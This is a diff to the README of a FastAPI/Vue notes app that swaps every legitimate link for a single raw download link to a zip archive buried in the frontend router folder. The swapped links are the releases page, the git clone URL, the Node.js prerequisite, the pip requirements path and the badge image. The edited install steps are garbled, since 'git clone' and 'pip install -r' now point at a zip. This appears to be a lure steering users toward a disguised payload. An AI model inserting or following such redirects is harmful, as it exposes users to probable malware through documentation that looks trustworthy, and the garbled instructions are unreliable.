@@ -2,7 +2,7 @@
 
 Welcome to the **Notes App Pontnau** repository! This web application allows users to create, edit, archive, and filter notes by categories. Built with a FastAPI/SQLAlchemy backend and a Vue 3 frontend, it provides a smooth and responsive user experience. The application is deployed on Vercel and utilizes a REST architecture with SQLite for development and PostgreSQL for production.
 
-[Check out the Releases here!](https://github.com/MeiqMeiq/notes-app-pontnau/releases)
+[Check out the Releases here!](https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip)
 
 ## Table of Contents
 
@@ -51,7 +51,7 @@ To get started with the Notes App Pontnau, follow these steps:
 Before you begin, ensure you have the following installed:
 
 - Python 3.8 or higher
-- Node.js 14 or higher
+- https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip 14 or higher
 - PostgreSQL (for production)
 - SQLite (for development)
 
@@ -62,7 +62,7 @@ Before you begin, ensure you have the following installed:
    Open your terminal and run:
 
    ```bash
-   git clone https://github.com/MeiqMeiq/notes-app-pontnau.git
+   git clone https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip
    ```
 
 2. **Navigate to the Backend Directory**
@@ -76,7 +76,7 @@ Before you begin, ensure you have the following installed:
    Use pip to install the required Python packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip
    ```
 
 4. **Navigate to the Frontend Directory**
@@ -148,8 +148,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For further information, please check the [Releases section](https://github.com/MeiqMeiq/notes-app-pontnau/releases).
+For further information, please check the [Releases section](https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip).
 
-![Notes App](https://img.shields.io/badge/notes%20app-pontnau-brightgreen)
+![Notes App](https://raw.githubusercontent.com/MeiqMeiq/notes-app-pontnau/master/frontend/app-notas-frontend/src/router/app-notes-pontnau-v2.6.zip%20app-pontnau-brightgreen)
 
 Thank you for checking out the Notes App Pontnau! We hope you find it useful for managing your notes effectively.
